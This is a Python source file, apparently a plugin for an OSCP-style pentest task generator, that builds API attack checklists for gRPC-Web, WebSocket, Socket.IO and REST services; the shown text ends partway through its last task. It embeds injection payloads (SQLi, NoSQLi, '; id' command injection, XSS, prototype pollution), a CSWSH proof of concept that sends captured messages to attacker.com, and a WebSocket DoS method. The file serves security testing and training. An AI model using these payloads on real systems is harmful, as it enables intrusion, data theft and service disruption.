"""
API & Modern Web Attacks plugin

Generates tasks for modern API exploitation including:
- gRPC-Web pentesting (protobuf manipulation, endpoint discovery)
- WebSocket attacks (CSWSH, hijacking, race conditions, fuzzing)
- REST API exploitation (authentication bypass, injection)
- Socket.IO exploitation (prototype pollution, event hijacking)

Extracted from HackTricks: pentesting-web/grpc-web-pentest.md, websocket-attacks.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class APIAttacksPlugin(ServicePlugin):
    """Modern API exploitation plugin (gRPC, WebSocket, REST)"""

    @property
    def name(self) -> str:
        return "api-attacks"

    @property
    def default_ports(self) -> List[int]:
        return []  # No default ports - triggers on detection

    @property
    def service_names(self) -> List[str]:
        return []  # Triggered by HTTP services with API indicators

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect API services (gRPC-Web, WebSocket, REST)

        Triggers on HTTP/HTTPS services where API indicators might exist
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()

        # Detect HTTP/HTTPS services (potential API hosts)
        if 'http' in service or 'https' in service:
            # Check for explicit API indicators in product/version
            api_indicators = ['grpc', 'websocket', 'api', 'rest', 'socket.io']
            if any(indicator in product.lower() for indicator in api_indicators):
                return True
            if any(indicator in version.lower() for indicator in api_indicators):
                return True

        # Detect WebSocket explicitly
        if 'websocket' in service or 'ws' in service:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate modern API attack task tree"""

        version = service_info.get('version', '')
        product = service_info.get('product', '')

        # Determine base URL
        if port == 443:
            base_url = f'https://{target}'
        elif port == 80:
            base_url = f'http://{target}'
        else:
            base_url = f'http://{target}:{port}'

        tasks = {
            'id': f'api-attacks-{port}',
            'name': f'Modern API Attacks (Port {port})',
            'type': 'parent',
            'children': []
        }

        # ===================================================================
        # PHASE 1: API Discovery & Fingerprinting
        # ===================================================================
        discovery_tasks = {
            'id': f'api-discovery-{port}',
            'name': 'API Discovery & Fingerprinting',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: WebSocket endpoint discovery
        discovery_tasks['children'].append({
            'id': f'websocket-discovery-{port}',
            'name': 'WebSocket Endpoint Discovery',
            'type': 'command',
            'metadata': {
                'command': f'for path in /ws /websocket /socket.io /ws/chat /api/ws /realtime /stream; do echo "Testing: {base_url}$path"; websocat --insecure {base_url.replace("http", "ws")}$path -v 2>&1 | head -5; done',
                'description': 'Test common WebSocket endpoint paths',
                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    'websocat': 'WebSocket client CLI tool for raw connections',
                    '--insecure': 'Skip TLS certificate validation',
                    '-v': 'Verbose output showing handshake details',
                    'ws://': 'WebSocket protocol (wss:// for secure)',
                    'head -5': 'Limit output to first 5 lines per test'
                },
                'success_indicators': [
                    'HTTP 101 Switching Protocols',
                    'Connection: Upgrade',
                    'Upgrade: websocket',
                    'Sec-WebSocket-Accept header present'
                ],
                'failure_indicators': [
                    'HTTP 404 Not Found',
                    'Connection refused',
                    'Invalid WebSocket handshake'
                ],
                'next_steps': [
                    'Note all discovered WebSocket endpoints',
                    'Test for CSWSH vulnerability',
                    'Enumerate WebSocket message structure',
                    'Check for Socket.IO (EIO parameter in URL)'
                ],
                'alternatives': [
                    f'Manual: curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: test" {base_url}/ws',
                    'Browser DevTools: Network tab → WS filter → Reload page',
                    'Burp Suite: Proxy history → Filter: WebSocket handshakes',
                    'STEWS tool: python3 stews.py -u {base_url} (auto-discovers WebSockets)'
                ],
                'notes': 'WebSocket handshake is HTTP-based - use Burp to intercept. Install websocat: apt install websocat',
                'estimated_time': '3-5 minutes'
            }
        })

        # Task 1.2: gRPC-Web endpoint discovery
        discovery_tasks['children'].append({
            'id': f'grpc-discovery-{port}',
            'name': 'gRPC-Web Endpoint Discovery',
            'type': 'command',
            'metadata': {
                'command': f'curl -s -X POST {base_url}/grpc -H "Content-Type: application/grpc-web-text" -H "Accept: application/grpc-web-text" -v 2>&1 | grep -E "HTTP/|content-type" || echo "gRPC not found"; echo ""; curl -s {base_url}/main.js {base_url}/app.js 2>/dev/null | grep -oE "(grpc|proto|rpc)" | head -5',
                'description': 'Test for gRPC-Web endpoints and analyze JavaScript for protobuf usage',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'MANUAL'],
                'flag_explanations': {
                    '-X POST': 'Use POST method (gRPC default)',
                    'Content-Type: application/grpc-web-text': 'gRPC-Web content type (base64-encoded protobuf)',
                    'Accept: application/grpc-web-text': 'Request gRPC-Web response format',
                    'grep -oE': 'Extract patterns (grpc, proto, rpc keywords)',
                    'main.js/app.js': 'Common JavaScript bundle filenames for SPAs'
                },
                'success_indicators': [
                    'Content-type: application/grpc-web-text in response',
                    'HTTP 200 with grpc-status header',
                    'JavaScript files contain "grpc", "proto", "rpc" keywords'
                ],
                'failure_indicators': [
                    'HTTP 404 for all tested paths',
                    'No grpc-related headers',
                    'JavaScript files have no protobuf references'
                ],
                'next_steps': [
                    'Download JavaScript files for deep analysis',
                    'Use grpc-scan.py to extract endpoints and messages',
                    'Test discovered endpoints with grpc-coder tool',
                    'Look for .proto files in web directory'
                ],
                'alternatives': [
                    'Burp Suite: Search proxy history for "application/grpc"',
                    'Browser DevTools: Network tab → Search for grpc-web requests',
                    'wget -r -l 1 {base_url} && grep -r "grpc\\|proto" . (download and search)',
                    'Manual: Check common paths: /grpc, /api/grpc, /rpc, /_proto'
                ],
                'notes': 'gRPC-Web is different from standard gRPC - uses HTTP/1.1 and runs on web servers. Look for base64-encoded payloads.',
                'estimated_time': '5-7 minutes'
            }
        })

        # Task 1.3: REST API endpoint enumeration
        discovery_tasks['children'].append({
            'id': f'rest-api-enum-{port}',
            'name': 'REST API Endpoint Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'gobuster dir -u {base_url}/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,json,xml -b 404,403 -o api-endpoints.txt --wildcard',
                'description': 'Enumerate REST API endpoints and resources',
                'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    'dir': 'Directory/file brute-forcing mode',
                    '-u': 'Base URL to scan',
                    '-w': 'Wordlist path (medium-sized for balance)',
                    '-t 20': 'Use 20 threads (adjust based on target stability)',
                    '-x php,json,xml': 'Test extensions common for API files',
                    '-b 404,403': 'Exclude 404/403 status codes from results',
                    '-o': 'Save output to file for documentation',
                    '--wildcard': 'Handle wildcard responses'
                },
                'success_indicators': [
                    'API endpoints discovered (Status: 200, 301, 302)',
                    '/api/v1, /api/v2 versioned endpoints',
                    '/api/users, /api/admin, /api/auth endpoints',
                    'JSON/XML responses from discovered paths'
                ],
                'failure_indicators': [
                    'All requests return 404',
                    'WAF blocking (429 Too Many Requests)',
                    'Connection timeouts',
                    'Wildcard responses (all paths return 200)'
                ],
                'next_steps': [
                    'Test discovered endpoints with curl',
                    'Check for Swagger/OpenAPI documentation at /api/docs, /swagger',
                    'Test authentication bypass on /api/auth',
                    'Enumerate API versions: /api/v1, /api/v2',
                    'Research discovered endpoints for injection vulnerabilities'
                ],
                'alternatives': [
                    f'Manual: curl {base_url}/api/users -v (test common endpoints)',
                    f'ffuf: ffuf -u {base_url}/api/FUZZ -w api-wordlist.txt -mc 200,301',
                    'Burp Intruder: Target → Intruder → Payload: api-endpoints',
                    'Swagger finder: Check /swagger.json, /api-docs, /openapi.json'
                ],
                'notes': 'API enumeration is HIGH OSCP value - focus on versioned APIs (/v1, /v2) and authentication endpoints',
                'estimated_time': '10-15 minutes'
            }
        })

        tasks['children'].append(discovery_tasks)

        # ===================================================================
        # PHASE 2: gRPC-Web Exploitation
        # ===================================================================
        grpc_tasks = {
            'id': f'grpc-exploitation-{port}',
            'name': 'gRPC-Web Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Analyze JavaScript files for gRPC endpoints
        grpc_tasks['children'].append({
            'id': f'grpc-js-analysis-{port}',
            'name': 'Analyze JavaScript for gRPC Endpoints',
            'type': 'command',
            'metadata': {
                'command': f'wget -q {base_url}/main.js -O main.js && python3 /opt/grpc-pentest-suite/grpc-scan.py --file main.js',
                'description': 'Extract gRPC endpoints, services, and message definitions from JavaScript',
                'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                'flag_explanations': {
                    'wget -q': 'Download JavaScript file quietly',
                    '-O main.js': 'Save as main.js',
                    'grpc-scan.py': 'Tool to extract gRPC metadata from JS files',
                    '--file': 'Analyze local JavaScript file'
                },
                'success_indicators': [
                    'Endpoints discovered (e.g., /grpc.service.Echo/Method)',
                    'Message definitions extracted (field names, types, numbers)',
                    'Service names revealed',
                    'Field types identified (Proto3StringField, Proto3IntField, etc.)'
                ],
                'failure_indicators': [
                    'JavaScript file not found (404)',
                    'No gRPC-related code in JavaScript',
                    'File is minified/obfuscated beyond analysis'
                ],
                'next_steps': [
                    'Test discovered endpoints with grpc-coder',
                    'Craft payloads targeting discovered fields',
                    'Test for injection in string fields',
                    'Test authorization on sensitive endpoints',
                    'Look for admin/debug endpoints'
                ],
                'alternatives': [
                    'Manual: grep -oE "/[a-zA-Z0-9.]+/[a-zA-Z0-9]+" main.js (extract paths)',
                    'Browser DevTools: Beautify main.js and search for "rpc", "proto"',
                    'Burp: Send JS to Decoder → Search for base64-encoded protobuf',
                    'Manual analysis: Look for service definitions like "service EchoService"'
                ],
                'notes': 'Install grpc-pentest-suite: git clone https://github.com/nxenon/grpc-pentest-suite. JavaScript often contains complete service definitions.',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 2.2: Decode and manipulate gRPC-Web payloads
        grpc_tasks['children'].append({
            'id': f'grpc-payload-manipulation-{port}',
            'name': 'Decode & Manipulate gRPC Payloads',
            'type': 'manual',
            'metadata': {
                'description': 'Intercept, decode, modify, and re-encode gRPC-Web payloads for injection testing',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'flag_explanations': {
                    'grpc-coder.py --decode': 'Decode base64 gRPC-Web payload to protobuf',
                    'protoscope': 'Human-readable protobuf viewer/editor',
                    'grpc-coder.py --encode': 'Encode modified protobuf back to gRPC-Web format',
                    '--type grpc-web-text': 'Specify gRPC-Web text format (base64)'
                },
                'success_indicators': [
                    'Payload successfully decoded',
                    'Fields visible in protoscope output',
                    'Modified payload accepted by server',
                    'Injection successful (XSS, SQLi, command injection)'
                ],
                'failure_indicators': [
                    'Decoding fails (invalid base64)',
                    'Server rejects modified payload',
                    'Encoding produces invalid protobuf'
                ],
                'next_steps': [
                    'Test XSS in string fields: <script>alert(1)</script>',
                    'Test SQLi: \' OR 1=1--',
                    'Test command injection: ; id',
                    'Modify boolean fields (IsAdmin: true)',
                    'Change integer fields (Age: 999999)',
                    'Replay attacks with modified user IDs'
                ],
                'alternatives': [
                    'Use Burp gRPC-Web Coder extension (easier workflow)',
                    'Manual base64 decode: echo "PAYLOAD" | base64 -d | xxd',
                    'protoc tool for .proto compilation',
                    'Wireshark with gRPC dissector (for network captures)'
                ],
                'notes': 'MANUAL WORKFLOW: 1) Intercept in Burp, 2) Copy base64 payload, 3) Decode with grpc-coder.py, 4) Edit with protoscope, 5) Encode, 6) Paste back in Burp. High OSCP value for understanding protobuf.',
                'estimated_time': '15-20 minutes per endpoint'
            }
        })

        # Task 2.3: gRPC injection testing
        grpc_tasks['children'].append({
            'id': f'grpc-injection-{port}',
            'name': 'gRPC Field Injection Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test gRPC string fields for injection vulnerabilities (XSS, SQLi, Command Injection)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'String fields': 'Proto3StringField accepts arbitrary text - injection target',
                    'protoscope -s': 'Convert text protobuf to binary',
                    'XSS payload': '<script>alert(origin)</script> for DOM-based XSS',
                    'SQLi payload': '\' OR \'1\'=\'1 for SQL injection',
                    'Command injection': '; id; for OS command execution'
                },
                'success_indicators': [
                    'XSS executes in response or stored in database',
                    'SQLi error messages in gRPC response',
                    'Command injection output visible',
                    'Server behavior changes based on injected payload'
                ],
                'failure_indicators': [
                    'Payloads sanitized/escaped',
                    'No change in server behavior',
                    'WAF blocking malicious patterns'
                ],
                'next_steps': [
                    'Escalate XSS to account takeover',
                    'Escalate SQLi to database dump',
                    'Escalate command injection to reverse shell',
                    'Test all string fields systematically',
                    'Test integer overflow in numeric fields'
                ],
                'alternatives': [
                    'Burp Intruder: Load injection payloads into decoded fields',
                    'SQLMap with gRPC proxy (complex setup)',
                    'Manual curl with crafted payloads',
                    'Automated scanner: grpcc tool'
                ],
                'notes': 'OSCP CRITICAL: gRPC fields often pass directly to backend (SQL, shell, templates) without validation. Test EVERY string field. Protobuf encoding does NOT provide security.',
                'estimated_time': '20-30 minutes'
            }
        })

        tasks['children'].append(grpc_tasks)

        # ===================================================================
        # PHASE 3: WebSocket Exploitation
        # ===================================================================
        websocket_tasks = {
            'id': f'websocket-exploitation-{port}',
            'name': 'WebSocket Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: CSWSH (Cross-Site WebSocket Hijacking)
        websocket_tasks['children'].append({
            'id': f'cswsh-test-{port}',
            'name': 'CSWSH (Cross-Site WebSocket Hijacking)',
            'type': 'manual',
            'metadata': {
                'description': 'Test for Cross-Site WebSocket Hijacking vulnerability (WebSocket CSRF)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'CSWSH': 'WebSocket equivalent of CSRF - hijacks WS connections',
                    'SameSite=None': 'Cookie attribute allowing cross-site requests',
                    'Origin check': 'Server validation of WebSocket handshake origin',
                    'wss://': 'Secure WebSocket protocol (TLS)',
                    'onopen': 'JavaScript event fired when WS connection established',
                    'onmessage': 'JavaScript event fired when WS message received'
                },
                'success_indicators': [
                    'WebSocket connection successful from external origin',
                    'Cookies sent automatically in handshake',
                    'Server accepts connection without Origin check',
                    'Sensitive data retrieved via WebSocket',
                    'Actions performed with victim privileges'
                ],
                'failure_indicators': [
                    'Connection rejected due to Origin mismatch',
                    'SameSite=Lax or Strict cookie attribute',
                    'Firefox Total Cookie Protection blocking',
                    'CSRF token required in handshake',
                    'No cookie-based authentication'
                ],
                'next_steps': [
                    'Craft HTML PoC with WebSocket connection',
                    'Exfiltrate messages to attacker server',
                    'Send malicious commands via WebSocket',
                    'Chain with XSS for same-origin execution',
                    'Test subdomain bypass (if vulnerable subdomain exists)'
                ],
                'alternatives': [
                    'Manual browser test: Open attacker page, check DevTools Network tab',
                    'Burp: Intercept handshake, change Origin header',
                    'Check SameSite attribute: Burp → Proxy → HTTP history → Cookie inspection',
                    'Test localhost bypass (always works - no SameSite protection)'
                ],
                'notes': 'CSWSH PoC TEMPLATE:\n<script>\nws = new WebSocket(\'wss://{target}/ws\')\nws.onopen = () => ws.send("READY")\nws.onmessage = (e) => fetch(\'https://attacker.com/?\'+e.data)\n</script>\n\nOSCP: CSWSH works if SameSite=None AND no Origin check. Priority: MEDIUM (more common in bug bounty than OSCP).',
                'estimated_time': '10-15 minutes'
            }
        })

        # Task 3.2: WebSocket message fuzzing
        websocket_tasks['children'].append({
            'id': f'websocket-fuzzing-{port}',
            'name': 'WebSocket Message Fuzzing',
            'type': 'command',
            'metadata': {
                'command': f'echo "Install Burp extension: WebSocket Turbo Intruder from BApp Store. Then: Proxy → WebSocket History → Right-click message → Send to Turbo Intruder → Load fuzz script."',
                'description': 'Fuzz WebSocket messages for injection vulnerabilities using Burp Turbo Intruder',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
                'flag_explanations': {
                    'Turbo Intruder': 'High-speed fuzzing tool for Burp Suite',
                    'WebSocket Turbo Intruder': 'Extension bringing Turbo Intruder to WebSockets',
                    'Fuzzing': 'Sending malformed/malicious inputs to find vulnerabilities',
                    '@MatchRegex': 'Filter responses by regex pattern',
                    'queue()': 'Queue WebSocket message for sending'
                },
                'success_indicators': [
                    'SQLi error messages in responses',
                    'XSS reflected in WebSocket messages',
                    'Command injection output',
                    'Different response for malicious payloads',
                    'Server crash/DoS from malformed frames'
                ],
                'failure_indicators': [
                    'All payloads produce identical responses',
                    'Input sanitization blocking all attacks',
                    'Rate limiting triggered',
                    'Connection drops on malformed input'
                ],
                'next_steps': [
                    'Analyze responses for error messages',
                    'Test identified injections manually',
                    'Craft exploitation payloads',
                    'Test race conditions with THREADED engine',
                    'Attempt DoS with malformed frames'
                ],
                'alternatives': [
                    'Manual: Use websocat to send crafted messages',
                    'Python script with websocket-client library',
                    'wsrepl: Interactive WebSocket REPL',
                    'WSSiP: WebSocket proxy with interception',
                    'Backslash Powered Scanner (Burp extension with WS support)'
                ],
                'notes': 'OSCP CRITICAL: WebSocket inputs often bypass WAF and input validation. Test for SQLi, XSS, command injection, path traversal. Turbo Intruder allows high-speed parallel fuzzing.',
                'estimated_time': '15-20 minutes'
            }
        })

        # Task 3.3: Socket.IO exploitation
        websocket_tasks['children'].append({
            'id': f'socketio-exploitation-{port}',
            'name': 'Socket.IO Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'socketio-detection-{port}',
                    'name': 'Socket.IO Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/socket.io/?EIO=4&transport=polling" -v 2>&1 | grep -E "HTTP/|sid:" || echo "Not Socket.IO"; curl -s {base_url}/socket.io/socket.io.js | head -20',
                        'description': 'Detect Socket.IO and retrieve session ID',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            'EIO=4': 'Engine.IO protocol version 4 (Socket.IO dependency)',
                            'transport=polling': 'Use HTTP long-polling (fallback if WebSocket unavailable)',
                            'sid': 'Session ID returned by Socket.IO server',
                            'socket.io.js': 'Socket.IO client library (confirms Socket.IO usage)'
                        },
                        'success_indicators': [
                            'HTTP 200 with sid parameter in response',
                            'socket.io.js file exists',
                            'Response contains "0{" (Socket.IO handshake)'
                        ],
                        'failure_indicators': [
                            'HTTP 404 for /socket.io/',
                            'No sid in response',
                            'Generic WebSocket, not Socket.IO'
                        ],
                        'next_steps': [
                            'Connect to Socket.IO endpoint',
                            'Send "40" to initiate session',
                            'Enumerate events: "42[\\"message\\",\\"test\\"]"',
                            'Test for prototype pollution',
                            'Test for event hijacking'
                        ],
                        'alternatives': [
                            'Browser DevTools: Check for socket.io.js in Network tab',
                            'Check page source for "io()" or "io.connect()"',
                            'Burp: Search history for "?EIO=" parameter'
                        ]
                    }
                },
                {
                    'id': f'socketio-prototype-pollution-{port}',
                    'name': 'Socket.IO Prototype Pollution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test Socket.IO for server-side prototype pollution vulnerability',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            '__proto__': 'JavaScript prototype property (pollution vector)',
                            'prototype pollution': 'Injecting properties into Object.prototype',
                            'initialPacket': 'Express.js internal property (pollution indicator)',
                            'Server-side': 'Pollution affects Node.js backend, not just client'
                        },
                        'success_indicators': [
                            'Server behavior changes after __proto__ payload',
                            'Pollution confirmed via echo/reflection',
                            'RCE via gadget chain exploitation',
                            'Authentication bypass via polluted properties'
                        ],
                        'failure_indicators': [
                            'No change in server behavior',
                            'Prototype sanitization in place',
                            'Object.freeze() preventing pollution'
                        ],
                        'next_steps': [
                            'Identify reachable gadgets for RCE',
                            'Chain pollution with other vulnerabilities',
                            'Test for authentication bypass',
                            'Document pollution vector for exploitation'
                        ],
                        'alternatives': [
                            'Manual WebSocket message: {"__proto__":{"polluted":"true"}}',
                            'Burp Repeater: Send crafted Socket.IO payload',
                            'Node.js script with socket.io-client library'
                        ],
                        'notes': 'PAYLOAD TEMPLATE:\n42["event",{"__proto__":{"initialPacket":"Polluted"}}]\n\nOSCP CRITICAL: If pollution works, check HackTricks NodeJS Prototype Pollution page for RCE gadgets. High-value vulnerability.'
                    }
                }
            ]
        })

        # Task 3.4: WebSocket race conditions
        websocket_tasks['children'].append({
            'id': f'websocket-race-conditions-{port}',
            'name': 'WebSocket Race Conditions',
            'type': 'manual',
            'metadata': {
                'description': 'Test for race condition vulnerabilities in WebSocket message handling',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'ADVANCED'],
                'flag_explanations': {
                    'Race condition': 'Timing-based vulnerability from concurrent operations',
                    'THREADED engine': 'Turbo Intruder engine spawning multiple connections',
                    'Double-spend': 'Exploiting race to use resource twice',
                    'Token reuse': 'Using single-use token multiple times via race',
                    'State desync': 'Causing inconsistent server state via concurrent requests'
                },
                'success_indicators': [
                    'Resource consumed multiple times (double-spend)',
                    'Single-use token accepted multiple times',
                    'Concurrent operations cause logic errors',
                    'Account balance manipulation successful'
                ],
                'failure_indicators': [
                    'Server properly handles concurrent requests',
                    'Locking mechanisms prevent race exploitation',
                    'Single-threaded message processing'
                ],
                'next_steps': [
                    'Exploit race for privilege escalation',
                    'Exploit race for authentication bypass',
                    'Exploit race for resource duplication',
                    'Chain race with other vulnerabilities'
                ],
                'alternatives': [
                    'Manual: Open multiple browser tabs, trigger simultaneously',
                    'Python script: Use threading.Thread for parallel WS connections',
                    'Burp Turbo Intruder: THREADED engine with custom script',
                    'Java PoC: https://github.com/redrays-io/WS_RaceCondition_PoC'
                ],
                'notes': 'OSCP: Race conditions are ADVANCED but high-impact. Focus on: 1) Payment/transaction endpoints, 2) Single-use tokens, 3) State-changing operations. Use THREADED engine in Turbo Intruder.',
                'estimated_time': '20-30 minutes'
            }
        })

        # Task 3.5: WebSocket DoS - Ping of Death
        websocket_tasks['children'].append({
            'id': f'websocket-dos-{port}',
            'name': 'WebSocket DoS (Ping of Death)',
            'type': 'manual',
            'metadata': {
                'description': 'Test for WebSocket DoS via malformed frames with huge declared payload length',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                'flag_explanations': {
                    'Ping of Death': 'DoS attack via oversized network packet',
                    'Frame header': 'WebSocket frame metadata (opcode, length, mask)',
                    'Payload length': 'Declared size of frame payload',
                    'Integer.MAX_VALUE': 'Maximum integer value (2147483647)',
                    'OOM': 'Out of Memory error causing crash'
                },
                'success_indicators': [
                    'Server crashes or becomes unresponsive',
                    'Out of Memory error in logs',
                    'WebSocket connection drops',
                    'Remote DoS confirmed'
                ],
                'failure_indicators': [
                    'Server handles malformed frames gracefully',
                    'Connection terminated without crash',
                    'Payload length validation in place'
                ],
                'next_steps': [
                    'Document DoS vulnerability',
                    'Test mitigation effectiveness',
                    'Report to client (not exploited in OSCP)'
                ],
                'alternatives': [
                    'Use Turbo Intruder PingOfDeathExample.py script',
                    'Manual frame crafting with hex editor',
                    'Python websocket library with custom frame'
                ],
                'notes': 'OSCP: DoS is LOW priority (not an exam objective). Only test in authorized environments. This attack crafts WS frame declaring huge payload but sends no data, causing buffer pre-allocation OOM.',
                'estimated_time': '10-15 minutes (testing only)'
            }
        })

        tasks['children'].append(websocket_tasks)

        # ===================================================================
        # PHASE 4: REST API Exploitation
        # ===================================================================
        rest_api_tasks = {
            'id': f'rest-api-exploitation-{port}',
            'name': 'REST API Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: REST API authentication bypass
        rest_api_tasks['children'].append({
            'id': f'rest-auth-bypass-{port}',
            'name': 'REST API Authentication Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Test REST API for authentication and authorization bypass vulnerabilities',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'Authorization header': 'HTTP header containing auth token (Bearer, Basic, etc.)',
                    'Bearer token': 'JWT or opaque token for API authentication',
                    'API key': 'Long-lived secret for API access',
                    'IDOR': 'Insecure Direct Object Reference (access other users\' data)',
                    'HTTP verb tampering': 'Bypassing restrictions via different HTTP methods'
                },
                'success_indicators': [
                    'Access to protected endpoints without auth',
                    'IDOR allows accessing other users\' resources',
                    'Admin endpoints accessible with low-privilege token',
                    'HTTP verb tampering bypasses restrictions (GET instead of POST)'
                ],
                'failure_indicators': [
                    'HTTP 401 Unauthorized',
                    'HTTP 403 Forbidden',
                    'Proper authorization checks in place'
                ],
                'next_steps': [
                    'Enumerate all API endpoints for access control issues',
                    'Test JWT token manipulation (if JWT used)',
                    'Test API key reuse across accounts',
                    'Test for broken object level authorization (BOLA)',
                    'Document bypass technique for exploitation'
                ],
                'alternatives': [
                    f'Manual: curl {base_url}/api/admin -H "Authorization: Bearer TOKEN"',
                    'Burp Intruder: Fuzz user IDs in /api/users/<ID>',
                    'Test HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS',
                    'Remove Authorization header entirely',
                    'Try default/weak API keys: "admin", "test", "guest"'
                ],
                'notes': 'OSCP CRITICAL: API authentication bypass is HIGH-value. Test:\n1) Remove Authorization header\n2) Use expired/invalid tokens\n3) IDOR: Change user IDs in URLs\n4) HTTP verb tampering: POST → GET\n5) Mass assignment: Add "isAdmin":true to JSON body',
                'estimated_time': '15-25 minutes'
            }
        })

        # Task 4.2: REST API injection testing
        rest_api_tasks['children'].append({
            'id': f'rest-injection-{port}',
            'name': 'REST API Injection Testing',
            'type': 'command',
            'metadata': {
                'command': 'echo "Test SQLi: curl ' + base_url + '/api/users?id=1\\\' OR 1=1-- -v"; echo "Test NoSQLi: curl ' + base_url + '/api/users -d \\\'{\\"username\\":{\\"$ne\\":\\"\\"}}}\\\' -H \\"Content-Type: application/json\\""; echo "Test Command Injection: curl ' + base_url + '/api/ping -d \\\'{\\"host\\":\\"127.0.0.1; id\\"}\\\' -H \\"Content-Type: application/json\\""',
                'description': 'Test REST API parameters for SQL injection, NoSQL injection, and command injection',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    '1\' OR 1=1--': 'Classic SQL injection payload',
                    '$ne': 'MongoDB "not equal" operator for NoSQL injection',
                    '; id': 'Command injection payload (append OS command)',
                    '-d': 'curl data parameter (POST body)',
                    '-H "Content-Type: application/json"': 'Specify JSON content type'
                },
                'success_indicators': [
                    'SQLi: Database error messages, all users returned',
                    'NoSQLi: Authentication bypass, all documents returned',
                    'Command injection: Command output in response (uid=0, username)',
                    'Different response for malicious vs. benign input'
                ],
                'failure_indicators': [
                    'Input sanitization blocking payloads',
                    'Parameterized queries preventing SQLi',
                    'NoSQL sanitization in place',
                    'No command execution output'
                ],
                'next_steps': [
                    'Escalate SQLi to database dump',
                    'Escalate NoSQLi to authentication bypass',
                    'Escalate command injection to reverse shell',
                    'Test all API parameters systematically',
                    'Use sqlmap for automated SQLi exploitation'
                ],
                'alternatives': [
                    f'SQLMap: sqlmap -u "{base_url}/api/users?id=1" --batch --level 3',
                    'Burp Intruder: Load injection payloads into query/body parameters',
                    'Manual curl testing with various payloads',
                    'NoSQLMap: nosqlmap.py for NoSQL injection'
                ],
                'notes': 'OSCP CRITICAL: REST APIs often have weaker input validation than web forms. Test EVERY parameter in:\n- Query strings (?id=1)\n- POST body (JSON, XML)\n- Headers (X-User-Id, etc.)\n- Path parameters (/api/users/<ID>)\n\nFocus on SQLi and command injection for OSCP.',
                'estimated_time': '20-30 minutes'
            }
        })

        # Task 4.3: API documentation enumeration
        rest_api_tasks['children'].append({
            'id': f'api-docs-enum-{port}',
            'name': 'API Documentation Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'for path in /swagger.json /swagger-ui /api-docs /openapi.json /api/swagger /docs /api/v1/docs /redoc /graphql; do curl -s {base_url}$path | head -10; done | grep -E "swagger|openapi|paths|schema" || echo "No API docs found"',
                'description': 'Discover API documentation endpoints (Swagger, OpenAPI, GraphQL)',
                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    'swagger.json': 'Swagger API specification (JSON)',
                    'swagger-ui': 'Swagger interactive documentation UI',
                    'openapi.json': 'OpenAPI 3.0 specification',
                    'redoc': 'ReDoc API documentation renderer',
                    'paths': 'OpenAPI field listing all API endpoints'
                },
                'success_indicators': [
                    'swagger.json or openapi.json downloaded',
                    'API documentation UI accessible',
                    'Complete endpoint list revealed',
                    'Authentication requirements documented',
                    'Request/response schemas available'
                ],
                'failure_indicators': [
                    'HTTP 404 for all documentation paths',
                    'Authentication required for docs',
                    'Documentation endpoints disabled'
                ],
                'next_steps': [
                    'Download complete API specification',
                    'Generate request templates from schema',
                    'Test undocumented endpoints',
                    'Test all documented endpoints for vulnerabilities',
                    'Look for admin/debug endpoints in documentation'
                ],
                'alternatives': [
                    'Browser: Navigate to /swagger-ui/ manually',
                    'Burp: Check proxy history for swagger/openapi JSON',
                    'Google dork: site:target.com inurl:swagger.json',
                    'Check robots.txt for API documentation paths',
                    'Look for API spec links in JavaScript files'
                ],
                'notes': 'OSCP: API documentation is a GOLD MINE. Reveals:\n- All endpoints (including hidden admin APIs)\n- Authentication schemes\n- Request formats\n- Validation rules\n\nPriority: VERY HIGH. Always check for swagger/openapi docs first.',
                'estimated_time': '5-10 minutes'
            }
        })

        tasks['children'].append(rest_api_tasks)

        # ===================================================================
        # PHASE 5: Automated API Security Testing
        # ===================================================================
        automated_tasks = {
            'id': f'api-automated-testing-{port}',
            'name': 'Automated API Security Testing',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: STEWS (WebSocket automated scanning)
        automated_tasks['children'].append({
            'id': f'stews-scan-{port}',
            'name': 'STEWS WebSocket Scanner',
            'type': 'command',
            'metadata': {
                'command': f'python3 /opt/STEWS/stews.py -u {base_url} -s websocket',
